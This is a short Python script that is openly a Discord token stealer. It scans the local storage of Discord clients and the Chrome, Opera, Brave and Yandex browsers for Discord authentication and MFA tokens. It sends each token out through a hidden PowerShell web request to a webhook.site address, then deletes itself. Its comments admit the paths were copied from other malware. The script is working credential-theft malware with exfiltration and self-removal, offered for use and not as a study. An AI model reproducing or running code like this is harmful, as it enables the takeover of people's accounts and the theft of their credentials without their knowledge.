import os

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
CMD = "powershell -windowstyle hidden Invoke-WebRequest https://webhook.site/<token> -Method 'POST' -Body @{\'token\'=\'CONTENT\'}"
tokens = []

# Yes I stole the paths from Vortex
PATHS = [
    ROAMING +"\\Discord",
    ROAMING + "\\discordcanary",
     ROAMING+"\\discordptb",
     LOCAL+"\\Google\\Chrome\\User Data\\Default",
    ROAMING+"\\Opera Software\\Opera Stable",
    LOCAL+"\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    LOCAL+"\\Yandex\\YandexBrowser\\User Data\\Default"
]

# Skiddy but works
def gettokens(path):
    path+="\\Local Storage\\leveldb"
    try:
        for file_name in os.listdir(path):
            if file_name.endswith(".log") or file_name.endswith(".ldb"):
                    for line in open(f"{path}\\{file_name}",errors="ignore").readlines():
                        if line.strip():
                            if "token" in line and "discord.com" in line:
                                tokensearch = line[line.index("token"):].split("\"")
                                if len(tokensearch) > 1:
                                    tokens.append(tokensearch[1])
                            elif "mfa." in line:
                                tokens.append(line [line.index("mfa."):].replace("\n",'').replace("\"",'').replace('\x00','')[:88])
                                #tokens.append(st[:st.index('\x')])
    except IOError:
        pass

if __name__ == "__main__":
    thisfile = os.path.abspath(__file__)
    for path in PATHS:
        gettokens(path)
    print(tokens)
    content_str = "{"
    for x in tokens:
        os.system(CMD.replace("CONTENT",x))
    content_str = content_str[:len(content_str)-1]
    content_str+="}"

    os.remove(thisfile)



